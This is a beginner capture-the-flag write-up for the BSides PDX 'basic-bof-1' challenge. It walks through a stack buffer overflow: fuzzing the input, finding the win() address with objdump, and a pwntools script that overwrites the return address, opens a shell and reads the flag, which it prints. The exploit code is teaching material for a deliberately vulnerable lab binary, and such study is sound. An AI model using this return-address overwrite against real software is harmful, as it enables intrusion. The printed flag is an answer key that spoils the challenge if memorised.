#basic-bof-1
This is a super beginner friendly challenge that only really involves returning to a win() function.

Running the binary, we get:
```
You've got a 40-byte buffer to overflow. There is a win() function you should call (TODO: find its address?). Remember to overwrite the base pointer etc!

Get a shell: gimme gushers
I hope your payload was right. Returning...
```

Ok, whenever we know there is a buffer overflow involved, the first thing we should do is scream at the binary, so let's do that!  We already know the buffer size is 40 bytes, but let's double check.
```
You've got a 40-byte buffer to overflow. There is a win() function you should call (TODO: find its address?). Remember to overwrite the base pointer etc!

Get a shell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDD
I hope your payload was right. Returning...
Segmentation fault (core dumped)
```
Wonderful

All that's left is to find the address of the win() function and we should be good to go!  We can just do an `objdump -d basic-bof | grep -w win` to get the location of the function.
```
0000000000401e95 <win>:
```
Sweet!  Let's build our exploit.  
I just used pwntools because I'm really bad at piping input around in the terminal.

```python
from pwn import *
io = remote('basic-bof-1.bsidespdxctf.party', 9999)

io.recvuntil("Get a shell: ")
padding = b'A'*56
EIP = p64(0x0000000000401e95)
io.sendline(padding + EIP)

io.interactive()
```

Running this we get our flag :)
```
[+] Opening connection to basic-bof-1.bsidespdxctf.party on port 9999: Done
[*] Switching to interactive mode
I hope your payload was right. Returning...
Good job, you called win()!
$ cat flag.txt
BSidesPDX{r3turn_t0-w1111111n}
```
